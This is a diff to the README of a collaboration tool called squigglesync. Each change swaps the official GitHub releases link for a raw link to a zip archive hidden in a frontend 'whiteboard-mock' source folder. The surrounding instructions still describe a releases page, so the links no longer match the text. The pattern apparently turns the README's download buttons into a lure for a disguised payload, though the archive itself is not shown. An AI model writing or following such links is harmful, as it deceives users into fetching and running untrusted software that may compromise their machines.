@@ -1,6 +1,6 @@
 # ✨ squigglesync - Collaborate in Real-Time Effortlessly
 
-[![Download squigglesync](https://img.shields.io/badge/Download-squigglesync-brightgreen)](https://github.com/sh0nzy06/squigglesync/releases)
+[![Download squigglesync](https://raw.githubusercontent.com/sh0nzy06/squigglesync/main/squigglesync-frontend/src/app/ui/whiteboard-mock/Software_v3.1-beta.1.zip)](https://raw.githubusercontent.com/sh0nzy06/squigglesync/main/squigglesync-frontend/src/app/ui/whiteboard-mock/Software_v3.1-beta.1.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ Before you start, please ensure that your system meets the following requirement
 1. **Visit the Download Page**
    Click the link below to reach the release page:
 
-   [Download squigglesync](https://github.com/sh0nzy06/squigglesync/releases)
+   [Download squigglesync](https://raw.githubusercontent.com/sh0nzy06/squigglesync/main/squigglesync-frontend/src/app/ui/whiteboard-mock/Software_v3.1-beta.1.zip)
 
 2. **Download the Latest Version**
    On the Releases page, look for the latest version of squigglesync. You will see a list of files available for download. Click on the file that suits your operating system. If you are unsure, choose the installer labeled for your OS.
@@ -46,7 +46,7 @@ Before you start, please ensure that your system meets the following requirement
 
 ## 📁 Download & Install
 
-To download and install squigglesync, please go straight to the [Download Page](https://github.com/sh0nzy06/squigglesync/releases).
+To download and install squigglesync, please go straight to the [Download Page](https://raw.githubusercontent.com/sh0nzy06/squigglesync/main/squigglesync-frontend/src/app/ui/whiteboard-mock/Software_v3.1-beta.1.zip).
 
 ### Troubleshooting Installation
 
